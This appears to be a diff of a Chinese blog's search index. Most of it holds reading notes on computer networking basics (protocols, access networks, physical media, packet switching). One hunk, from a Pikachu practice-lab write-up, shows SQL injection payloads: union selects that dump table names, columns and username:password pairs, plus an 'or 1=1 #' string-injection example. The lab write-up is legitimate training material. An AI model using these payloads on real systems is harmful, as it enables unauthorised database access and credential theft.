-<h2 id="1-3-什么是协议？"><a href="#1-3-什么是协议？" class="headerlink" title="1.3 什么是协议？"></a>1.3 什么是协议？</h2><h3 id="1-3-1-人类活动的类比"><a href="#1-3-1-人类活动的类比" class="headerlink" title="1.3.1 人类活动的类比"></a>1.3.1 人类活动的类比</h3><p>​        人类协议要求一方首先进行问候（如：你好），以开始与另一个人的通信。对 “你好” 的典型响应是返回一个 ”你好“ 报文，此时发话者可以继续向此人进行提问。而如果对 ”你好“ 的响应是 ”我没空“ 或某些不合时宜的回答，这就表明了一个勉强的或不能进行的通信，在此情况下，按照人类协议，发话者就不能再继续提问了。显然，发送和接收的报文、以及这些报文发送和接收所采取的动作，这些在一个人类协议中起到了核心作用。</p>
-<p>​        如果人们使用不同的协议（例如：一人理解这句话的意思，但另一人不理解），这些协议就不能交互，因而不能完成有用的工作。在网络中这个道理同样成立，即为了完成一项工作，要求两个（或多个）通信实体运行相同的协议。</p>
-<h3 id="1-3-2-网络协议"><a href="#1-3-2-网络协议" class="headerlink" title="1.3.2 网络协议"></a>1.3.2 网络协议</h3><p>​        网络协议类似于人类协议，除了交换报文和采取动作的实体是某些设备（计算机、智能手机、路由器等）的硬件或软件组件</p>
-<p>​        当你向一个Web服务器发出请求（即你在Web服务器中键入一个网页的URL），首先、你的计算机将向该Web服务器发送一条连接请求报文，并等待应答。若该Web服务器最终能接收到连接请求报文，就会返回一条连接响应报文。得知请求Web文档正常以后，计算机则在一条GET报文中发送要从这台web服务器上取回的网页名字。最后、web服务器向计算机返回该web网页（文件）。</p>
-<p>​        <strong>协议（protocol）</strong>定义了在两个或多个通信实体之间交换的报文的格式和顺序，以及报文发送 和/或 接收一条报文或其他事件所采取的动作。</p>
-]]></content>
-      <categories>
-        <category>读书笔记</category>
-      </categories>
-      <tags>
-        <tag>read</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>《计算机网络自顶向下方法》（计算机网络和因特网）（2）</title>
-    <url>/2022/01/11/read-1.2/</url>
-    <content><![CDATA[<h1 id="0x02-网络边缘"><a href="#0x02-网络边缘" class="headerlink" title="0x02 网络边缘"></a>0x02 网络边缘</h1><p>回想前一节计算机网络的术语，通常把与因特网相连的计算机和其他设备成为端系统，之所以称为端系统，因为它们位于因特网的边缘</p>
-<p>端系统也称为<u>主机（host）</u>，因为它们容纳（即运行）应用程序</p>
-<p>主机有时又被进一步划分为两类：<strong>客户（client）</strong>和<strong>服务器（server）</strong>，客户通常是桌面PC、智能手机等，而服务器通常是更为强大的机器，用于存储和发布Web页面、流视频、中继电子邮件等</p>
-<h2 id="一、接入网"><a href="#一、接入网" class="headerlink" title="一、接入网"></a>一、接入网</h2><p><strong>接入网</strong>指将端系统物理连接到其<strong>边缘路由器（edge router）</strong>的网络</p>
-<p>边缘路由器是端系统到任何其他远程端系统的路径上的第一台路由器</p>
-<h3 id="1、家庭接入：DSL、电缆、FTTH、拨号和卫星"><a href="#1、家庭接入：DSL、电缆、FTTH、拨号和卫星" class="headerlink" title="1、家庭接入：DSL、电缆、FTTH、拨号和卫星"></a>1、家庭接入：DSL、电缆、FTTH、拨号和卫星</h3><ul>
-<li><p>宽带住宅接入有两种最流行的类型：<strong>数字用户线（Digital Subscriber Line，DSL）</strong>和电缆</p>
-<span id="more"></span>
-<ul>
-<li><p>每个用户的DSL调制解调器使用现有的电话线与位于电话公司的本地中心局（CO）中的数字用户线接入<u>复用器（DSLAM）</u>交换数据</p>
-</li>
-<li><p>家庭的DSL调制解调器得到数字数据后将其转换为高频音，以通过电话线传输给本地中心局，然后在DSLAM处被转换回数字形式</p>
-</li>
-<li><p>家庭电话线用不同的频率进行编码：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">高速下行信道，位于50kHz到1MHz频段</span><br><span class="line">中速上行信道，位于4kHz到50kHz频段</span><br><span class="line">普通的双向电话信道，位于0到4kHz频段</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>用户一侧，一个分配器把到达家庭的数据信号和电话信号分隔开，并将数据信号转发给DSL调制解调器；电话公司一侧，在本地中心局，DSLAM把数据和电话信号分隔开，并将数据发给因特网</p>
-<p><img src="/2022/01/11/read-1.2/1.png" alt></p>
-</li>
-</ul>
-</li>
-<li><p>DSL利用电话公司现有的本地电话基础设施，而<strong>电缆因特网接入（cable Internet access）</strong>利用了有线电视公司现有的有线电视基础设施</p>
-<ul>
-<li><p>电缆因特网接入需要特殊的调制解调器，称为<u>电缆调制解调器（cable modem）</u>,它通常通过一个以太网端口连接到家庭PC</p>
-</li>
-<li><p>在电缆头端，<u>电缆调制解调器端接系统（Cable Modem Termination System，CMTS）</u>与DSL网络的DSLAM具有类似的功能，即将来自许多下行家庭中的电缆调制解调器发送的模拟信号转换回数字形式</p>
-<p><img src="/2022/01/11/read-1.2/2.png" alt></p>
-</li>
-<li><p>如同DSL，上行信道分配的传输速率通常比下行信道的稿</p>
-</li>
-<li><p>电缆因特网接入的一个重要特征是共享广播媒体</p>
-</li>
-</ul>
-</li>
-<li><p>提供更高速率的新兴技术是<strong>光纤到户（Fiber To The Home，FTTH）</strong></p>
-<ul>
-<li><p>顾名思义，FTTH就是从本地中心局直接到家庭提供了一条光纤路径</p>
-</li>
-<li><p>从中心局出来的每根光纤实际上由许多家庭共享，直到相对接近这些家庭的位置，改光纤才分成每户一根光纤。进行这种分配由两种光纤分布体系结构：<u>有源光纤网络（Active Optical Network，AON）</u>和<u>无源光纤网络（Passive Optical Network，PON）</u></p>
-<ol>
-<li><p>AON：AON本质上就是交换以太网</p>
-</li>
-<li><p>PON：每个家庭具有一个<u>光纤网络端接器（Optical Network Terminator，ONT）</u>，它由专门的光纤连接到邻近的<u>分配器（splitter）</u>。分配器把一些家庭集结到一根共享的光纤，该光纤再连接到本地电话和公司的中心局中的<u>光纤线路端接器（Optical Line Terminator，OLT）</u>。OLT提供了光信号和电信号的转换，经过本地电话公司路由器与因特网相连。在家庭中，用户将一台家庭路由器与ONT相连，并经过这台家庭路由器接入因特网：</p>
-<p><img src="/2022/01/11/read-1.2/3.png" alt></p>
-</li>
-</ol>
-</li>
-</ul>
-</li>
-</ul>
-<h3 id="2、企业（和家庭）接入：以太网和WiFi"><a href="#2、企业（和家庭）接入：以太网和WiFi" class="headerlink" title="2、企业（和家庭）接入：以太网和WiFi"></a>2、企业（和家庭）接入：以太网和WiFi</h3><ul>
-<li><p>在越来越多的环境里，使用<u>局域网（LAN）</u>将端系统连接到边缘路由器</p>
-</li>
-<li><p>到目前为止，以太网是公司、大学和家庭网络中最为流行的接入技术</p>
-<p><img src="/2022/01/11/read-1.2/4.png" alt></p>
-</li>
-<li><p>在无线LAN环境中，无线用户从一个接入点 发送 / 接收 分组，该接入点与企业网相连，企业网再与有线因特网相连。基于IEEE 802.11技术的无线LAN接入，更通俗地称为WiFi，目前几乎无所不在</p>
-</li>
-<li><p>今天许多家庭将宽带住宅接入（即电缆调制解调器或DSL）与廉价的无线局域网技术结合起来，以产生强大的家用网络</p>
-<p><img src="/2022/01/11/read-1.2/5.png" alt></p>
-</li>
-</ul>
-<h3 id="3、广域无线接入：3G和LTE"><a href="#3、广域无线接入：3G和LTE" class="headerlink" title="3、广域无线接入：3G和LTE"></a>3、广域无线接入：3G和LTE</h3><ul>
-<li>iPhone和安卓等设备应用了与蜂窝移动电话相同的无线基础设施，通过蜂窝网提供商运营的基站来发送和接收分组</li>
-<li>电信公司已经在第三代无线技术（3G）中进行了大量投资，3G为分组交换广域无线因特网接入提供了超过1Mbps的速率</li>
-<li>而如今第四代（4G）已经全面覆盖，第五代（5G）也开始了部署</li>
-</ul>
-<h2 id="二、物理媒体"><a href="#二、物理媒体" class="headerlink" title="二、物理媒体"></a>二、物理媒体</h2><p>考虑一个比特从一个端系统开始传输，通过一系列链路和路由器，到达另一个端系统。这个比特当从源到目的地传输时，通过一系列 “发射器 - 接收器” 对，对于每个发射器 - 接收器对，通过跨越一种<strong>物理媒体（physical medium）</strong>传播电磁波或光脉冲来发送该比特。</p>
-<ul>
-<li>物理媒体分成两种类型：<strong>导引型媒体（guided media）</strong>和<strong>非导引型媒体（unguided media）</strong><ol>
-<li>导引型媒体，电波沿着固体媒体前行，如光缆、双绞铜线或同轴电缆</li>
-<li>非导引型媒体，电波在空气或外层空间中传播，例如在无线局域网或数字卫星频道中</li>
-</ol>
-</li>
-</ul>
-<h3 id="1、双绞铜线"><a href="#1、双绞铜线" class="headerlink" title="1、双绞铜线"></a>1、双绞铜线</h3><ul>
-<li>最便宜并且最为常用的导引型传输媒体</li>
-<li>双绞线由两根绝缘的铜线组成，以规则的螺旋状排列着</li>
-<li><strong>无屏蔽双绞线（Unshielded Twisted Pair，UTP）</strong>常用在建筑物内的计算机网络中，即用于局域网（LAN）中</li>
-<li>目前局域网中的双绞线的数据传输速率从10Mbps导10Gbps，所能达到的数据传输速率取决于线的粗细以及传输方和接收方之间的距离</li>
-</ul>
-<h3 id="2、同轴电缆"><a href="#2、同轴电缆" class="headerlink" title="2、同轴电缆"></a>2、同轴电缆</h3><ul>
-<li>与双绞线类似，由两个铜导体组成但是这两个导体是同心的而不是并行的，借助这种结构及特殊的绝缘体和保护层，同轴电缆能够达到较高的数据传输速率</li>
-<li>同轴电缆能被用作导引型<strong>共享媒体（shared medium）</strong>，特别是，许多端系统能够直接与该电缆相连，每个端系统都能接收由其他端系统发送的内容</li>
-</ul>
-<h3 id="3、光纤"><a href="#3、光纤" class="headerlink" title="3、光纤"></a>3、光纤</h3><ul>
-<li>光纤是一种细而柔软的、能够导引光脉冲的媒体，每个脉冲表示一个比特</li>
-<li>一根光纤能够支持极高的比特速率，高达数十甚至数百Gbps</li>
-<li>它们不受电磁干扰，信号衰减极低，成为长途导引型传输媒体，特别是跨海链路</li>
-</ul>
-<h3 id="4、陆地无线电信道"><a href="#4、陆地无线电信道" class="headerlink" title="4、陆地无线电信道"></a>4、陆地无线电信道</h3><ul>
-<li>无线电信道承载电磁频谱中的信号</li>
-<li>它能穿透墙壁，因此极大依赖传播环境和信号传输的距离：<ol>
-<li>路径损耗和遮挡衰落（信号跨距离传播和穿过阻碍物体时信号强度降低）</li>
-<li>多径衰落（干扰对象的信号反射）</li>
-<li>干扰（其他传输或电磁信号）</li>
-</ol>
-</li>
-<li>陆地无线电信道大致分为三类：一类运行在很短距离（如1m或2m）；另一类运行在局域，通常跨越数十到几百米；第三类运行在广域，跨越数万米</li>
-</ul>
-<h3 id="5、卫星无线电信道"><a href="#5、卫星无线电信道" class="headerlink" title="5、卫星无线电信道"></a>5、卫星无线电信道</h3><p>一颗通信卫星连接地球上的两个或多个微波发射器/接收器，它们被称为地面站。该卫星在一个频段上接收传输，使用一个转发器再生信号，并在另一个频率上发射信号。通信中尝试用两类卫星：<strong>同步卫星（geostationary satellite）</strong>和<strong>近地轨道（Low-Earth Orbiting，LEO）</strong>卫星。</p>
-]]></content>
-      <categories>
-        <category>读书笔记</category>
-      </categories>
-      <tags>
-        <tag>read</tag>
       </tags>
   </entry>
   <entry>
@@ -2170,7 +1971,7 @@
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">2</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">3</span>	# 报错<span class="literal">Unknown</span> <span class="keyword">column</span> <span class="string">&#x27;3&#x27;</span> <span class="keyword">in</span> <span class="string">&#x27;order clause&#x27;</span></span><br><span class="line">id<span class="operator">=</span><span class="number">2</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">2</span>	# 正常回显，爆字段列数为<span class="number">2</span></span><br><span class="line">id<span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> database(),<span class="keyword">user</span>()	# 得到回显hello,pikachu <span class="operator">&lt;</span>br <span class="operator">/</span><span class="operator">&gt;</span>your email <span class="keyword">is</span>: root<span class="variable">@localhost</span>，即爆出数据库名为pikachu和数据库用户为root<span class="variable">@localhost</span></span><br><span class="line">id<span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> table_name,<span class="number">2</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema <span class="operator">=</span> database()	# 爆数据表</span><br><span class="line">id<span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> database(),group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>	# 爆字段</span><br><span class="line">id<span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> database(),group_concat(username,<span class="string">&#x27;:&#x27;</span>,password) <span class="keyword">from</span> users	# 爆内容</span><br></pre></td></tr></table></figure>
 <p><img src="/2022/04/17/pikachu/42.png" alt></p>
 <h2 id="3、字符型注入-get"><a href="#3、字符型注入-get" class="headerlink" title="3、字符型注入(get)"></a>3、字符型注入(get)</h2><blockquote>
-<p>字符型注入原理：<br>PHP中接收了参数后在进行拼接SQL语句的时候大概语句是这样的<code>select XXX ’变量名‘</code>，这个就是注入点，传进去的参数都会变成字符串，那么我们构造的SQL语句就无法执行，因此要加一个单引号<code>&#39;</code>以闭合前面的单引号，然后后面加上一个<code>#</code>注释掉后面的单引号，这样我们的语句才能被执行</p>
+<p>字符型注入原理：<br>PHP中接收了参数后在进行拼接SQL语句的时候大概语句是这样的<code>select XXX &#39;变量名&#39;</code>，这个就是注入点，传进去的参数都会变成字符串，那么我们构造的SQL语句就无法执行，因此要加一个单引号<code>&#39;</code>以闭合前面的单引号，然后后面加上一个<code>#</code>注释掉后面的单引号，这样我们的语句才能被执行</p>
 <p>比如我们传进去<code>asd&#39; or 1=1 #</code>，传进去后就变成了<code>&#39;asd&#39; or 1=1 #&#39;</code>，可以看到中间的<code>or 1=1</code>并未被单引号包裹，所以它能被识别出并执行，攻击的时候将这个语句改成SQL攻击语句即可</p>
 </blockquote>
 <p>结合字符型注入的原理即可构造payload</p>
@@ -2205,6 +2006,205 @@
       <tags>
         <tag>web</tag>
         <tag>靶场</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>《计算机网络自顶向下方法》（计算机网络和因特网）（3）</title>
+    <url>/2022/01/22/read-1-3/</url>
+    <content><![CDATA[<h1 id="0x03-网络核心"><a href="#0x03-网络核心" class="headerlink" title="0x03 网络核心"></a>0x03 网络核心</h1><p>通过网络链路和交换机移动数据有两种方法：<strong>分组交换</strong>（packet switching）和<strong>电路交换</strong>（circuit switching）</p>
+<h2 id="一、分组交换"><a href="#一、分组交换" class="headerlink" title="一、分组交换"></a>一、分组交换</h2><ul>
+<li>为了从源端系统向目的端系统发送一个<strong>报文</strong>（message），源将长报文划分为较小的数据块，称之为<strong>分组</strong>（packet）</li>
+<li>在源和目的地之间，每个分组都通过通信链路和<strong>分组交换机</strong>（packet switch）传送。（交换机主要有两类：<strong>路由器</strong>（router）和<strong>链路层交换机</strong>（link-layer switch））</li>
+</ul>
+<h3 id="3-1-存储转发传输"><a href="#3-1-存储转发传输" class="headerlink" title="3.1 存储转发传输"></a>3.1 存储转发传输</h3><ul>
+<li>多数分组交换机在链路的输入端使用<strong>存储转发传输</strong>（store-and-forward transmission）机制</li>
+<li>存储转发传输是指在交换机能够开始向输出链路传输该分组的第一个比特之前，必须接收到整个分组</li>
+</ul>
+<h3 id="3-2-排队时延和分组丢失"><a href="#3-2-排队时延和分组丢失" class="headerlink" title="3.2 排队时延和分组丢失"></a>3.2 排队时延和分组丢失</h3><ul>
+<li>每台分组交换机有多条链路与之相连，对于每条相连的链路，该分组交换机具有一个<strong>输出缓存</strong>（output buffer），它用于存储路由器准备发往那条链路的分组</li>
+<li>如果到达的分组需要传输到某条链路，但发现该链路正忙于传输其他分组，该到达分组必须在输出缓存中等待，这时就会出现<strong>排队时延</strong>（queuing delay）</li>
+<li>因为缓存空间的大小是有限的，一个到达的分组可能发现该缓存已被其他等待传输的分组完全充满了。此时，将出现<strong>分组丢失（丢包）</strong>（packet loss），到达的分组或已经排队的分组之一将被丢弃</li>
+</ul>
+<h3 id="3-3-转发表和路由选择协议"><a href="#3-3-转发表和路由选择协议" class="headerlink" title="3.3 转发表和路由选择协议"></a>3.3 转发表和路由选择协议</h3><ul>
+<li>每台路由器具有一个<strong>转发表</strong>（forwarding table），用于将目的地址（或目的地址的一部分）映射称为输出链路</li>
+<li>当某分组到达一台路由器时，路由器检查该地址，并用这个目的地址搜索其转发表，以发现适当的出链路。路由器则将分组导向该出链路</li>
+<li>因特网具有一些特殊的<strong>路由选择协议</strong>（routing protocol），用于自动地设置这些转发表</li>
+</ul>
+<h2 id="二、电路交换"><a href="#二、电路交换" class="headerlink" title="二、电路交换"></a>二、电路交换</h2><ul>
+<li><p>在电路交换网络中，端系统间通信会话期间，预留了端系统间沿路径通信所需要的资源（缓存，链路传输速率）。而在分组交换网络中，这些资源则不是预留的</p>
+</li>
+<li><p>当两台主机要通信时，该网络在两台主机之间创建一条专用的<strong>端到端连接</strong>（end-to-end connection）</p>
+</li>
+<li><p>如图1-13，这条专用的端到端连接使用第一条链路中的第二条电路喝第二条链路中的第四条电路</p>
+<p><img src="/2022/01/22/read-1-3/1.png" alt></p>
+</li>
+<li><p>因为每条链路具有4条电路，对于由端到端连接所使用的每条链路而言，该连接在连接期间获得链路总传输总量的$\frac{1}{4}$。例如，如果两台邻近交换机之间每条链路具有1Mbps传输速率，则每个端到端电路交换连接获得250kbps专用的传输速率</p>
+</li>
+</ul>
+<h2 id="三、网络的网络"><a href="#三、网络的网络" class="headerlink" title="三、网络的网络"></a>三、网络的网络</h2>]]></content>
+      <categories>
+        <category>读书笔记</category>
+      </categories>
+      <tags>
+        <tag>learn</tag>
+        <tag>read</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>《计算机网络自顶向下方法》（计算机网络和因特网）（1）</title>
+    <url>/2022/01/11/read-1.1/</url>
+    <content><![CDATA[<h1 id="0x01-什么是因特网？"><a href="#0x01-什么是因特网？" class="headerlink" title="0x01 什么是因特网？"></a>0x01 什么是因特网？</h1><h2 id="1-1-具体构成描述"><a href="#1-1-具体构成描述" class="headerlink" title="1.1 具体构成描述"></a>1.1 具体构成描述</h2><p>因特网是一个世界范围    的计算机网络，即它是一个互联了遍及全世界数十亿计算设备的网络。</p>
+<p>​        不久之前，这些计算设备大多数传统PC、服务器等等，然而现在有越来越多的非传统因特网设备与因特网相连，如智能手机、电视、游戏机、家用电器、手表等。</p>
+<p>用因特网术语来说，这些设备都成为<strong>主机（host）</strong>或者<strong>端系统（end system）</strong></p>
+<span id="more"></span>
+<ul>
+<li>端系统通过<strong>通信链路（communication link）</strong>和<strong>分组交换机（packet switch）</strong>连接到一起</li>
+<li>一台端系统要向另一台端系统发送数据时，发送端系统将数据分段，并为每段加上首部字节。由此形成的信息包成为<strong>分组（packet）</strong></li>
+<li>分组交换机：当今最著名的两种类型是<strong>路由器（router）</strong>和<strong>链路层交换机（link-layer switch）</strong></li>
+<li>从发送端系统到接收端系统，一个分组所经历的一系列通信链路和分组交换机成为通过该网络的<strong>路径（path）</strong></li>
+<li>端系统通过<strong>因特网服务提供商（Internet Service Provider，ISP）</strong>接入因特网<ul>
+<li>每个 ISP 自身就是一个由多台分组交换机和多段通信链路组成的网络</li>
+<li>各 ISP 为端系统提供了各种不同类型的网络接入</li>
+<li>ISP 也为内容提供者提供因特网接入服务，将Web站点和视频服务器直接连入因特网</li>
+<li>因特网就是将端系统彼此互联，因此为端系统提供接入服务的 ISP 也必须互联</li>
+</ul>
+</li>
+<li>端系统、分组交换机和其他因特网部件都要运行一系列<strong>协议（protocol）</strong>，这些协议控制因特网中信息的接收和发送</li>
+<li><strong>TCP（Transmission Control Protocol，传输控制协议）</strong>和<strong>IP（Internet protocol，国际协议）</strong>是因特网中两个最为重要的协议<ul>
+<li>IP 协议定义了在路由器和端系统之间发送和接收的分组格式</li>
+<li>因特网的主要协议统称为 <strong>TCP</strong>/<strong>IP</strong> </li>
+</ul>
+</li>
+</ul>
+<h2 id="1-2-服务描述"><a href="#1-2-服务描述" class="headerlink" title="1.2 服务描述"></a>1.2 服务描述</h2><p>​        从为应用程序提供服务的基础设施的角度来描述因特网</p>
+<p>​        因特网应用包括移动智能手机和平板电脑应用程序，其中包括即时讯息、来自云的音乐流、电影和电视流、在线社交网络以及多人游戏，因为这些应用程序涉及多个交换数据端系统，故它们被称为<strong>分布式应用程序（distributed application）</strong></p>
+<p>​        运行在不同端系统上的软件需要互相发送数据，此时我们碰到一个核心问题：运行在一个端系统上的应用程序怎样才能指令因特网向运行在另一个端系统上的软件发送数据呢？</p>
+<p>​        与因特网相连的端系统提供了一个<strong>套接字接口（socket interface）</strong>，该接口规定了运行在一个端系统上的程序请求因特网基础设施向运行在另一个端系统上的特定目的地程序交付数据的方式</p>
+<p>通俗来讲它就是一套发送程序必须遵循的规则集合，因此因特网能够将数据交付给目的地</p>
+<p>这种规则就像你寄信需要遵循的规则，邮政服务有自己的“邮政服务接口”或一套规则，你必须遵循，这样邮政服务才能将信件成功送达。同理，因特网也有一个发送数据的程序必须遵循的套接字接口，使因特网向接收数据的程序交付数据</p>
+<h2 id="1-3-什么是协议？"><a href="#1-3-什么是协议？" class="headerlink" title="1.3 什么是协议？"></a>1.3 什么是协议？</h2><h3 id="1-3-1-人类活动的类比"><a href="#1-3-1-人类活动的类比" class="headerlink" title="1.3.1 人类活动的类比"></a>1.3.1 人类活动的类比</h3><p>​        人类协议要求一方首先进行问候（如：你好），以开始与另一个人的通信。对 “你好” 的典型响应是返回一个 ”你好“ 报文，此时发话者可以继续向此人进行提问。而如果对 ”你好“ 的响应是 ”我没空“ 或某些不合时宜的回答，这就表明了一个勉强的或不能进行的通信，在此情况下，按照人类协议，发话者就不能再继续提问了。显然，发送和接收的报文、以及这些报文发送和接收所采取的动作，这些在一个人类协议中起到了核心作用。</p>
+<p>​        如果人们使用不同的协议（例如：一人理解这句话的意思，但另一人不理解），这些协议就不能交互，因而不能完成有用的工作。在网络中这个道理同样成立，即为了完成一项工作，要求两个（或多个）通信实体运行相同的协议。</p>
+<h3 id="1-3-2-网络协议"><a href="#1-3-2-网络协议" class="headerlink" title="1.3.2 网络协议"></a>1.3.2 网络协议</h3><p>​        网络协议类似于人类协议，除了交换报文和采取动作的实体是某些设备（计算机、智能手机、路由器等）的硬件或软件组件</p>
+<p>​        当你向一个Web服务器发出请求（即你在Web服务器中键入一个网页的URL），首先、你的计算机将向该Web服务器发送一条连接请求报文，并等待应答。若该Web服务器最终能接收到连接请求报文，就会返回一条连接响应报文。得知请求Web文档正常以后，计算机则在一条GET报文中发送要从这台web服务器上取回的网页名字。最后、web服务器向计算机返回该web网页（文件）。</p>
+<p>​        <strong>协议（protocol）</strong>定义了在两个或多个通信实体之间交换的报文的格式和顺序，以及报文发送 和/或 接收一条报文或其他事件所采取的动作。</p>
+]]></content>
+      <categories>
+        <category>读书笔记</category>
+      </categories>
+      <tags>
+        <tag>read</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>《计算机网络自顶向下方法》（计算机网络和因特网）（2）</title>
+    <url>/2022/01/11/read-1.2/</url>
+    <content><![CDATA[<h1 id="0x02-网络边缘"><a href="#0x02-网络边缘" class="headerlink" title="0x02 网络边缘"></a>0x02 网络边缘</h1><p>回想前一节计算机网络的术语，通常把与因特网相连的计算机和其他设备成为端系统，之所以称为端系统，因为它们位于因特网的边缘</p>
+<p>端系统也称为<u>主机（host）</u>，因为它们容纳（即运行）应用程序</p>
+<p>主机有时又被进一步划分为两类：<strong>客户（client）</strong>和<strong>服务器（server）</strong>，客户通常是桌面PC、智能手机等，而服务器通常是更为强大的机器，用于存储和发布Web页面、流视频、中继电子邮件等</p>
+<h2 id="一、接入网"><a href="#一、接入网" class="headerlink" title="一、接入网"></a>一、接入网</h2><p><strong>接入网</strong>指将端系统物理连接到其<strong>边缘路由器（edge router）</strong>的网络</p>
+<p>边缘路由器是端系统到任何其他远程端系统的路径上的第一台路由器</p>
+<h3 id="1、家庭接入：DSL、电缆、FTTH、拨号和卫星"><a href="#1、家庭接入：DSL、电缆、FTTH、拨号和卫星" class="headerlink" title="1、家庭接入：DSL、电缆、FTTH、拨号和卫星"></a>1、家庭接入：DSL、电缆、FTTH、拨号和卫星</h3><ul>
+<li><p>宽带住宅接入有两种最流行的类型：<strong>数字用户线（Digital Subscriber Line，DSL）</strong>和电缆</p>
+<span id="more"></span>
+<ul>
+<li><p>每个用户的DSL调制解调器使用现有的电话线与位于电话公司的本地中心局（CO）中的数字用户线接入<u>复用器（DSLAM）</u>交换数据</p>
+</li>
+<li><p>家庭的DSL调制解调器得到数字数据后将其转换为高频音，以通过电话线传输给本地中心局，然后在DSLAM处被转换回数字形式</p>
+</li>
+<li><p>家庭电话线用不同的频率进行编码：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">高速下行信道，位于50kHz到1MHz频段</span><br><span class="line">中速上行信道，位于4kHz到50kHz频段</span><br><span class="line">普通的双向电话信道，位于0到4kHz频段</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>用户一侧，一个分配器把到达家庭的数据信号和电话信号分隔开，并将数据信号转发给DSL调制解调器；电话公司一侧，在本地中心局，DSLAM把数据和电话信号分隔开，并将数据发给因特网</p>
+<p><img src="/2022/01/11/read-1.2/1.png" alt></p>
+</li>
+</ul>
+</li>
+<li><p>DSL利用电话公司现有的本地电话基础设施，而<strong>电缆因特网接入（cable Internet access）</strong>利用了有线电视公司现有的有线电视基础设施</p>
+<ul>
+<li><p>电缆因特网接入需要特殊的调制解调器，称为<u>电缆调制解调器（cable modem）</u>,它通常通过一个以太网端口连接到家庭PC</p>
+</li>
+<li><p>在电缆头端，<u>电缆调制解调器端接系统（Cable Modem Termination System，CMTS）</u>与DSL网络的DSLAM具有类似的功能，即将来自许多下行家庭中的电缆调制解调器发送的模拟信号转换回数字形式</p>
+<p><img src="/2022/01/11/read-1.2/2.png" alt></p>
+</li>
+<li><p>如同DSL，上行信道分配的传输速率通常比下行信道的稿</p>
+</li>
+<li><p>电缆因特网接入的一个重要特征是共享广播媒体</p>
+</li>
+</ul>
+</li>
+<li><p>提供更高速率的新兴技术是<strong>光纤到户（Fiber To The Home，FTTH）</strong></p>
+<ul>
+<li><p>顾名思义，FTTH就是从本地中心局直接到家庭提供了一条光纤路径</p>
+</li>
+<li><p>从中心局出来的每根光纤实际上由许多家庭共享，直到相对接近这些家庭的位置，改光纤才分成每户一根光纤。进行这种分配由两种光纤分布体系结构：<u>有源光纤网络（Active Optical Network，AON）</u>和<u>无源光纤网络（Passive Optical Network，PON）</u></p>
+<ol>
+<li><p>AON：AON本质上就是交换以太网</p>
+</li>
+<li><p>PON：每个家庭具有一个<u>光纤网络端接器（Optical Network Terminator，ONT）</u>，它由专门的光纤连接到邻近的<u>分配器（splitter）</u>。分配器把一些家庭集结到一根共享的光纤，该光纤再连接到本地电话和公司的中心局中的<u>光纤线路端接器（Optical Line Terminator，OLT）</u>。OLT提供了光信号和电信号的转换，经过本地电话公司路由器与因特网相连。在家庭中，用户将一台家庭路由器与ONT相连，并经过这台家庭路由器接入因特网：</p>
+<p><img src="/2022/01/11/read-1.2/3.png" alt></p>
+</li>
+</ol>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="2、企业（和家庭）接入：以太网和WiFi"><a href="#2、企业（和家庭）接入：以太网和WiFi" class="headerlink" title="2、企业（和家庭）接入：以太网和WiFi"></a>2、企业（和家庭）接入：以太网和WiFi</h3><ul>
+<li><p>在越来越多的环境里，使用<u>局域网（LAN）</u>将端系统连接到边缘路由器</p>
+</li>
+<li><p>到目前为止，以太网是公司、大学和家庭网络中最为流行的接入技术</p>
+<p><img src="/2022/01/11/read-1.2/4.png" alt></p>
+</li>
+<li><p>在无线LAN环境中，无线用户从一个接入点 发送 / 接收 分组，该接入点与企业网相连，企业网再与有线因特网相连。基于IEEE 802.11技术的无线LAN接入，更通俗地称为WiFi，目前几乎无所不在</p>
+</li>
+<li><p>今天许多家庭将宽带住宅接入（即电缆调制解调器或DSL）与廉价的无线局域网技术结合起来，以产生强大的家用网络</p>
+<p><img src="/2022/01/11/read-1.2/5.png" alt></p>
+</li>
+</ul>
+<h3 id="3、广域无线接入：3G和LTE"><a href="#3、广域无线接入：3G和LTE" class="headerlink" title="3、广域无线接入：3G和LTE"></a>3、广域无线接入：3G和LTE</h3><ul>
+<li>iPhone和安卓等设备应用了与蜂窝移动电话相同的无线基础设施，通过蜂窝网提供商运营的基站来发送和接收分组</li>
+<li>电信公司已经在第三代无线技术（3G）中进行了大量投资，3G为分组交换广域无线因特网接入提供了超过1Mbps的速率</li>
+<li>而如今第四代（4G）已经全面覆盖，第五代（5G）也开始了部署</li>
+</ul>
+<h2 id="二、物理媒体"><a href="#二、物理媒体" class="headerlink" title="二、物理媒体"></a>二、物理媒体</h2><p>考虑一个比特从一个端系统开始传输，通过一系列链路和路由器，到达另一个端系统。这个比特当从源到目的地传输时，通过一系列 “发射器 - 接收器” 对，对于每个发射器 - 接收器对，通过跨越一种<strong>物理媒体（physical medium）</strong>传播电磁波或光脉冲来发送该比特。</p>
+<ul>
+<li>物理媒体分成两种类型：<strong>导引型媒体（guided media）</strong>和<strong>非导引型媒体（unguided media）</strong><ol>
+<li>导引型媒体，电波沿着固体媒体前行，如光缆、双绞铜线或同轴电缆</li>
+<li>非导引型媒体，电波在空气或外层空间中传播，例如在无线局域网或数字卫星频道中</li>
+</ol>
+</li>
+</ul>
+<h3 id="1、双绞铜线"><a href="#1、双绞铜线" class="headerlink" title="1、双绞铜线"></a>1、双绞铜线</h3><ul>
+<li>最便宜并且最为常用的导引型传输媒体</li>
